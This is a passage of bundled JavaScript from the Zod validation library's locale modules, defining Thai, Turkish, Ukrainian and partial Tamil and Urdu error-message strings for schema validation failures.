          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: "${_issue.includes}" \u0B90 \u0B89\u0BB3\u0BCD\u0BB3\u0B9F\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        if (_issue.format === "regex")
          return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B9A\u0BB0\u0BAE\u0BCD: ${_issue.pattern} \u0BAE\u0BC1\u0BB1\u0BC8\u0BAA\u0BBE\u0B9F\u0BCD\u0B9F\u0BC1\u0B9F\u0BA9\u0BCD \u0BAA\u0BCA\u0BB0\u0BC1\u0BA8\u0BCD\u0BA4 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B8E\u0BA3\u0BCD: ${issue2.divisor} \u0B87\u0BA9\u0BCD \u0BAA\u0BB2\u0BAE\u0BBE\u0B95 \u0B87\u0BB0\u0BC1\u0B95\u0BCD\u0B95 \u0BB5\u0BC7\u0BA3\u0BCD\u0B9F\u0BC1\u0BAE\u0BCD`;
      case "unrecognized_keys":
        return `\u0B85\u0B9F\u0BC8\u0BAF\u0BBE\u0BB3\u0BAE\u0BCD \u0BA4\u0BC6\u0BB0\u0BBF\u0BAF\u0BBE\u0BA4 \u0BB5\u0BBF\u0B9A\u0BC8${issue2.keys.length > 1 ? "\u0B95\u0BB3\u0BCD" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `${issue2.origin} \u0B87\u0BB2\u0BCD \u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0BB5\u0BBF\u0B9A\u0BC8`;
      case "invalid_union":
        return "\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1";
      case "invalid_element":
        return `${issue2.origin} \u0B87\u0BB2\u0BCD \u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0BAE\u0BA4\u0BBF\u0BAA\u0BCD\u0BAA\u0BC1`;
      default:
        return `\u0BA4\u0BB5\u0BB1\u0BBE\u0BA9 \u0B89\u0BB3\u0BCD\u0BB3\u0BC0\u0B9F\u0BC1`;
    }
  };
};
function ta_default() {
  return {
    localeError: error38()
  };
}
// node_modules/zod/v4/locales/th.js
var error39 = () => {
  const Sizable = {
    string: { unit: "\u0E15\u0E31\u0E27\u0E2D\u0E31\u0E01\u0E29\u0E23", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" },
    file: { unit: "\u0E44\u0E1A\u0E15\u0E4C", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" },
    array: { unit: "\u0E23\u0E32\u0E22\u0E01\u0E32\u0E23", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" },
    set: { unit: "\u0E23\u0E32\u0E22\u0E01\u0E32\u0E23", verb: "\u0E04\u0E27\u0E23\u0E21\u0E35" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E17\u0E35\u0E48\u0E1B\u0E49\u0E2D\u0E19",
    email: "\u0E17\u0E35\u0E48\u0E2D\u0E22\u0E39\u0E48\u0E2D\u0E35\u0E40\u0E21\u0E25",
    url: "URL",
    emoji: "\u0E2D\u0E34\u0E42\u0E21\u0E08\u0E34",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u0E27\u0E31\u0E19\u0E17\u0E35\u0E48\u0E40\u0E27\u0E25\u0E32\u0E41\u0E1A\u0E1A ISO",
    date: "\u0E27\u0E31\u0E19\u0E17\u0E35\u0E48\u0E41\u0E1A\u0E1A ISO",
    time: "\u0E40\u0E27\u0E25\u0E32\u0E41\u0E1A\u0E1A ISO",
    duration: "\u0E0A\u0E48\u0E27\u0E07\u0E40\u0E27\u0E25\u0E32\u0E41\u0E1A\u0E1A ISO",
    ipv4: "\u0E17\u0E35\u0E48\u0E2D\u0E22\u0E39\u0E48 IPv4",
    ipv6: "\u0E17\u0E35\u0E48\u0E2D\u0E22\u0E39\u0E48 IPv6",
    cidrv4: "\u0E0A\u0E48\u0E27\u0E07 IP \u0E41\u0E1A\u0E1A IPv4",
    cidrv6: "\u0E0A\u0E48\u0E27\u0E07 IP \u0E41\u0E1A\u0E1A IPv6",
    base64: "\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E41\u0E1A\u0E1A Base64",
    base64url: "\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E41\u0E1A\u0E1A Base64 \u0E2A\u0E33\u0E2B\u0E23\u0E31\u0E1A URL",
    json_string: "\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E41\u0E1A\u0E1A JSON",
    e164: "\u0E40\u0E1A\u0E2D\u0E23\u0E4C\u0E42\u0E17\u0E23\u0E28\u0E31\u0E1E\u0E17\u0E4C\u0E23\u0E30\u0E2B\u0E27\u0E48\u0E32\u0E07\u0E1B\u0E23\u0E30\u0E40\u0E17\u0E28 (E.164)",
    jwt: "\u0E42\u0E17\u0E40\u0E04\u0E19 JWT",
    template_literal: "\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E17\u0E35\u0E48\u0E1B\u0E49\u0E2D\u0E19"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0E15\u0E31\u0E27\u0E40\u0E25\u0E02",
    array: "\u0E2D\u0E32\u0E23\u0E4C\u0E40\u0E23\u0E22\u0E4C (Array)",
    null: "\u0E44\u0E21\u0E48\u0E21\u0E35\u0E04\u0E48\u0E32 (null)"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u0E1B\u0E23\u0E30\u0E40\u0E20\u0E17\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E04\u0E27\u0E23\u0E40\u0E1B\u0E47\u0E19 instanceof ${issue2.expected} \u0E41\u0E15\u0E48\u0E44\u0E14\u0E49\u0E23\u0E31\u0E1A ${received}`;
        }
        return `\u0E1B\u0E23\u0E30\u0E40\u0E20\u0E17\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E04\u0E27\u0E23\u0E40\u0E1B\u0E47\u0E19 ${expected} \u0E41\u0E15\u0E48\u0E44\u0E14\u0E49\u0E23\u0E31\u0E1A ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u0E04\u0E48\u0E32\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E04\u0E27\u0E23\u0E40\u0E1B\u0E47\u0E19 ${stringifyPrimitive(issue2.values[0])}`;
        return `\u0E15\u0E31\u0E27\u0E40\u0E25\u0E37\u0E2D\u0E01\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E04\u0E27\u0E23\u0E40\u0E1B\u0E47\u0E19\u0E2B\u0E19\u0E36\u0E48\u0E07\u0E43\u0E19 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "\u0E44\u0E21\u0E48\u0E40\u0E01\u0E34\u0E19" : "\u0E19\u0E49\u0E2D\u0E22\u0E01\u0E27\u0E48\u0E32";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u0E40\u0E01\u0E34\u0E19\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue2.origin ?? "\u0E04\u0E48\u0E32"} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue2.maximum.toString()} ${sizing.unit ?? "\u0E23\u0E32\u0E22\u0E01\u0E32\u0E23"}`;
        return `\u0E40\u0E01\u0E34\u0E19\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue2.origin ?? "\u0E04\u0E48\u0E32"} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? "\u0E2D\u0E22\u0E48\u0E32\u0E07\u0E19\u0E49\u0E2D\u0E22" : "\u0E21\u0E32\u0E01\u0E01\u0E27\u0E48\u0E32";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0E19\u0E49\u0E2D\u0E22\u0E01\u0E27\u0E48\u0E32\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue2.origin} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u0E19\u0E49\u0E2D\u0E22\u0E01\u0E27\u0E48\u0E32\u0E01\u0E33\u0E2B\u0E19\u0E14: ${issue2.origin} \u0E04\u0E27\u0E23\u0E21\u0E35${adj} ${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with") {
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E15\u0E49\u0E2D\u0E07\u0E02\u0E36\u0E49\u0E19\u0E15\u0E49\u0E19\u0E14\u0E49\u0E27\u0E22 "${_issue.prefix}"`;
        }
        if (_issue.format === "ends_with")
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E15\u0E49\u0E2D\u0E07\u0E25\u0E07\u0E17\u0E49\u0E32\u0E22\u0E14\u0E49\u0E27\u0E22 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21\u0E15\u0E49\u0E2D\u0E07\u0E21\u0E35 "${_issue.includes}" \u0E2D\u0E22\u0E39\u0E48\u0E43\u0E19\u0E02\u0E49\u0E2D\u0E04\u0E27\u0E32\u0E21`;
        if (_issue.format === "regex")
          return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E15\u0E49\u0E2D\u0E07\u0E15\u0E23\u0E07\u0E01\u0E31\u0E1A\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E17\u0E35\u0E48\u0E01\u0E33\u0E2B\u0E19\u0E14 ${_issue.pattern}`;
        return `\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u0E15\u0E31\u0E27\u0E40\u0E25\u0E02\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E15\u0E49\u0E2D\u0E07\u0E40\u0E1B\u0E47\u0E19\u0E08\u0E33\u0E19\u0E27\u0E19\u0E17\u0E35\u0E48\u0E2B\u0E32\u0E23\u0E14\u0E49\u0E27\u0E22 ${issue2.divisor} \u0E44\u0E14\u0E49\u0E25\u0E07\u0E15\u0E31\u0E27`;
      case "unrecognized_keys":
        return `\u0E1E\u0E1A\u0E04\u0E35\u0E22\u0E4C\u0E17\u0E35\u0E48\u0E44\u0E21\u0E48\u0E23\u0E39\u0E49\u0E08\u0E31\u0E01: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u0E04\u0E35\u0E22\u0E4C\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07\u0E43\u0E19 ${issue2.origin}`;
      case "invalid_union":
        return "\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07: \u0E44\u0E21\u0E48\u0E15\u0E23\u0E07\u0E01\u0E31\u0E1A\u0E23\u0E39\u0E1B\u0E41\u0E1A\u0E1A\u0E22\u0E39\u0E40\u0E19\u0E35\u0E22\u0E19\u0E17\u0E35\u0E48\u0E01\u0E33\u0E2B\u0E19\u0E14\u0E44\u0E27\u0E49";
      case "invalid_element":
        return `\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07\u0E43\u0E19 ${issue2.origin}`;
      default:
        return `\u0E02\u0E49\u0E2D\u0E21\u0E39\u0E25\u0E44\u0E21\u0E48\u0E16\u0E39\u0E01\u0E15\u0E49\u0E2D\u0E07`;
    }
  };
};
function th_default() {
  return {
    localeError: error39()
  };
}
// node_modules/zod/v4/locales/tr.js
var error40 = () => {
  const Sizable = {
    string: { unit: "karakter", verb: "olmal\u0131" },
    file: { unit: "bayt", verb: "olmal\u0131" },
    array: { unit: "\xF6\u011Fe", verb: "olmal\u0131" },
    set: { unit: "\xF6\u011Fe", verb: "olmal\u0131" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "girdi",
    email: "e-posta adresi",
    url: "URL",
    emoji: "emoji",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "ISO tarih ve saat",
    date: "ISO tarih",
    time: "ISO saat",
    duration: "ISO s\xFCre",
    ipv4: "IPv4 adresi",
    ipv6: "IPv6 adresi",
    cidrv4: "IPv4 aral\u0131\u011F\u0131",
    cidrv6: "IPv6 aral\u0131\u011F\u0131",
    base64: "base64 ile \u015Fifrelenmi\u015F metin",
    base64url: "base64url ile \u015Fifrelenmi\u015F metin",
    json_string: "JSON dizesi",
    e164: "E.164 say\u0131s\u0131",
    jwt: "JWT",
    template_literal: "\u015Eablon dizesi"
  };
  const TypeDictionary = {
    nan: "NaN"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `Ge\xE7ersiz de\u011Fer: beklenen instanceof ${issue2.expected}, al\u0131nan ${received}`;
        }
        return `Ge\xE7ersiz de\u011Fer: beklenen ${expected}, al\u0131nan ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `Ge\xE7ersiz de\u011Fer: beklenen ${stringifyPrimitive(issue2.values[0])}`;
        return `Ge\xE7ersiz se\xE7enek: a\u015Fa\u011F\u0131dakilerden biri olmal\u0131: ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\xC7ok b\xFCy\xFCk: beklenen ${issue2.origin ?? "de\u011Fer"} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\xF6\u011Fe"}`;
        return `\xC7ok b\xFCy\xFCk: beklenen ${issue2.origin ?? "de\u011Fer"} ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\xC7ok k\xFC\xE7\xFCk: beklenen ${issue2.origin} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        return `\xC7ok k\xFC\xE7\xFCk: beklenen ${issue2.origin} ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `Ge\xE7ersiz metin: "${_issue.prefix}" ile ba\u015Flamal\u0131`;
        if (_issue.format === "ends_with")
          return `Ge\xE7ersiz metin: "${_issue.suffix}" ile bitmeli`;
        if (_issue.format === "includes")
          return `Ge\xE7ersiz metin: "${_issue.includes}" i\xE7ermeli`;
        if (_issue.format === "regex")
          return `Ge\xE7ersiz metin: ${_issue.pattern} desenine uymal\u0131`;
        return `Ge\xE7ersiz ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `Ge\xE7ersiz say\u0131: ${issue2.divisor} ile tam b\xF6l\xFCnebilmeli`;
      case "unrecognized_keys":
        return `Tan\u0131nmayan anahtar${issue2.keys.length > 1 ? "lar" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `${issue2.origin} i\xE7inde ge\xE7ersiz anahtar`;
      case "invalid_union":
        return "Ge\xE7ersiz de\u011Fer";
      case "invalid_element":
        return `${issue2.origin} i\xE7inde ge\xE7ersiz de\u011Fer`;
      default:
        return `Ge\xE7ersiz de\u011Fer`;
    }
  };
};
function tr_default() {
  return {
    localeError: error40()
  };
}
// node_modules/zod/v4/locales/uk.js
var error41 = () => {
  const Sizable = {
    string: { unit: "\u0441\u0438\u043C\u0432\u043E\u043B\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" },
    file: { unit: "\u0431\u0430\u0439\u0442\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" },
    array: { unit: "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" },
    set: { unit: "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0456\u0432", verb: "\u043C\u0430\u0442\u0438\u043C\u0435" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456",
    email: "\u0430\u0434\u0440\u0435\u0441\u0430 \u0435\u043B\u0435\u043A\u0442\u0440\u043E\u043D\u043D\u043E\u0457 \u043F\u043E\u0448\u0442\u0438",
    url: "URL",
    emoji: "\u0435\u043C\u043E\u0434\u0437\u0456",
    uuid: "UUID",
    uuidv4: "UUIDv4",
    uuidv6: "UUIDv6",
    nanoid: "nanoid",
    guid: "GUID",
    cuid: "cuid",
    cuid2: "cuid2",
    ulid: "ULID",
    xid: "XID",
    ksuid: "KSUID",
    datetime: "\u0434\u0430\u0442\u0430 \u0442\u0430 \u0447\u0430\u0441 ISO",
    date: "\u0434\u0430\u0442\u0430 ISO",
    time: "\u0447\u0430\u0441 ISO",
    duration: "\u0442\u0440\u0438\u0432\u0430\u043B\u0456\u0441\u0442\u044C ISO",
    ipv4: "\u0430\u0434\u0440\u0435\u0441\u0430 IPv4",
    ipv6: "\u0430\u0434\u0440\u0435\u0441\u0430 IPv6",
    cidrv4: "\u0434\u0456\u0430\u043F\u0430\u0437\u043E\u043D IPv4",
    cidrv6: "\u0434\u0456\u0430\u043F\u0430\u0437\u043E\u043D IPv6",
    base64: "\u0440\u044F\u0434\u043E\u043A \u0443 \u043A\u043E\u0434\u0443\u0432\u0430\u043D\u043D\u0456 base64",
    base64url: "\u0440\u044F\u0434\u043E\u043A \u0443 \u043A\u043E\u0434\u0443\u0432\u0430\u043D\u043D\u0456 base64url",
    json_string: "\u0440\u044F\u0434\u043E\u043A JSON",
    e164: "\u043D\u043E\u043C\u0435\u0440 E.164",
    jwt: "JWT",
    template_literal: "\u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456"
  };
  const TypeDictionary = {
    nan: "NaN",
    number: "\u0447\u0438\u0441\u043B\u043E",
    array: "\u043C\u0430\u0441\u0438\u0432"
  };
  return (issue2) => {
    switch (issue2.code) {
      case "invalid_type": {
        const expected = TypeDictionary[issue2.expected] ?? issue2.expected;
        const receivedType = parsedType(issue2.input);
        const received = TypeDictionary[receivedType] ?? receivedType;
        if (/^[A-Z]/.test(issue2.expected)) {
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F instanceof ${issue2.expected}, \u043E\u0442\u0440\u0438\u043C\u0430\u043D\u043E ${received}`;
        }
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F ${expected}, \u043E\u0442\u0440\u0438\u043C\u0430\u043D\u043E ${received}`;
      }
      case "invalid_value":
        if (issue2.values.length === 1)
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F ${stringifyPrimitive(issue2.values[0])}`;
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0430 \u043E\u043F\u0446\u0456\u044F: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F \u043E\u0434\u043D\u0435 \u0437 ${joinValues(issue2.values, "|")}`;
      case "too_big": {
        const adj = issue2.inclusive ? "<=" : "<";
        const sizing = getSizing(issue2.origin);
        if (sizing)
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u0432\u0435\u043B\u0438\u043A\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue2.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u043D\u044F"} ${sizing.verb} ${adj}${issue2.maximum.toString()} ${sizing.unit ?? "\u0435\u043B\u0435\u043C\u0435\u043D\u0442\u0456\u0432"}`;
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u0432\u0435\u043B\u0438\u043A\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue2.origin ?? "\u0437\u043D\u0430\u0447\u0435\u043D\u043D\u044F"} \u0431\u0443\u0434\u0435 ${adj}${issue2.maximum.toString()}`;
      }
      case "too_small": {
        const adj = issue2.inclusive ? ">=" : ">";
        const sizing = getSizing(issue2.origin);
        if (sizing) {
          return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u043C\u0430\u043B\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue2.origin} ${sizing.verb} ${adj}${issue2.minimum.toString()} ${sizing.unit}`;
        }
        return `\u0417\u0430\u043D\u0430\u0434\u0442\u043E \u043C\u0430\u043B\u0435: \u043E\u0447\u0456\u043A\u0443\u0454\u0442\u044C\u0441\u044F, \u0449\u043E ${issue2.origin} \u0431\u0443\u0434\u0435 ${adj}${issue2.minimum.toString()}`;
      }
      case "invalid_format": {
        const _issue = issue2;
        if (_issue.format === "starts_with")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u043F\u043E\u0447\u0438\u043D\u0430\u0442\u0438\u0441\u044F \u0437 "${_issue.prefix}"`;
        if (_issue.format === "ends_with")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u0437\u0430\u043A\u0456\u043D\u0447\u0443\u0432\u0430\u0442\u0438\u0441\u044F \u043D\u0430 "${_issue.suffix}"`;
        if (_issue.format === "includes")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u043C\u0456\u0441\u0442\u0438\u0442\u0438 "${_issue.includes}"`;
        if (_issue.format === "regex")
          return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u0440\u044F\u0434\u043E\u043A: \u043F\u043E\u0432\u0438\u043D\u0435\u043D \u0432\u0456\u0434\u043F\u043E\u0432\u0456\u0434\u0430\u0442\u0438 \u0448\u0430\u0431\u043B\u043E\u043D\u0443 ${_issue.pattern}`;
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 ${FormatDictionary[_issue.format] ?? issue2.format}`;
      }
      case "not_multiple_of":
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0435 \u0447\u0438\u0441\u043B\u043E: \u043F\u043E\u0432\u0438\u043D\u043D\u043E \u0431\u0443\u0442\u0438 \u043A\u0440\u0430\u0442\u043D\u0438\u043C ${issue2.divisor}`;
      case "unrecognized_keys":
        return `\u041D\u0435\u0440\u043E\u0437\u043F\u0456\u0437\u043D\u0430\u043D\u0438\u0439 \u043A\u043B\u044E\u0447${issue2.keys.length > 1 ? "\u0456" : ""}: ${joinValues(issue2.keys, ", ")}`;
      case "invalid_key":
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0438\u0439 \u043A\u043B\u044E\u0447 \u0443 ${issue2.origin}`;
      case "invalid_union":
        return "\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456";
      case "invalid_element":
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0435 \u0437\u043D\u0430\u0447\u0435\u043D\u043D\u044F \u0443 ${issue2.origin}`;
      default:
        return `\u041D\u0435\u043F\u0440\u0430\u0432\u0438\u043B\u044C\u043D\u0456 \u0432\u0445\u0456\u0434\u043D\u0456 \u0434\u0430\u043D\u0456`;
    }
  };
};
function uk_default() {
  return {
    localeError: error41()
  };
}

// node_modules/zod/v4/locales/ua.js
function ua_default() {
  return uk_default();
}
// node_modules/zod/v4/locales/ur.js
var error42 = () => {
  const Sizable = {
    string: { unit: "\u062D\u0631\u0648\u0641", verb: "\u06C1\u0648\u0646\u0627" },
    file: { unit: "\u0628\u0627\u0626\u0679\u0633", verb: "\u06C1\u0648\u0646\u0627" },
    array: { unit: "\u0622\u0626\u0679\u0645\u0632", verb: "\u06C1\u0648\u0646\u0627" },
    set: { unit: "\u0622\u0626\u0679\u0645\u0632", verb: "\u06C1\u0648\u0646\u0627" }
  };
  function getSizing(origin) {
    return Sizable[origin] ?? null;
  }
  const FormatDictionary = {
    regex: "\u0627\u0646 \u067E\u0679",
    email: "\u0627\u06CC \u0645\u06CC\u0644 \u0627\u06CC\u0688\u0631\u06CC\u0633",
    url: "\u06CC\u0648 \u0622\u0631 \u0627\u06CC\u0644",
    emoji: "\u0627\u06CC\u0645\u0648\u062C\u06CC",
    uuid: "\u06CC\u0648 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    uuidv4: "\u06CC\u0648 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC \u0648\u06CC 4",
    uuidv6: "\u06CC\u0648 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC \u0648\u06CC 6",
    nanoid: "\u0646\u06CC\u0646\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    guid: "\u062C\u06CC \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    cuid: "\u0633\u06CC \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    cuid2: "\u0633\u06CC \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC 2",
    ulid: "\u06CC\u0648 \u0627\u06CC\u0644 \u0622\u0626\u06CC \u0688\u06CC",
    xid: "\u0627\u06CC\u06A9\u0633 \u0622\u0626\u06CC \u0688\u06CC",
    ksuid: "\u06A9\u06D2 \u0627\u06CC\u0633 \u06CC\u0648 \u0622\u0626\u06CC \u0688\u06CC",
    datetime: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u0688\u06CC\u0679 \u0679\u0627\u0626\u0645",
    date: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u062A\u0627\u0631\u06CC\u062E",
    time: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u0648\u0642\u062A",
    duration: "\u0622\u0626\u06CC \u0627\u06CC\u0633 \u0627\u0648 \u0645\u062F\u062A",
    ipv4: "\u0622\u0626\u06CC \u067E\u06CC \u0648\u06CC 4 \u0627\u06CC\u0688\u0631\u06CC\u0633",
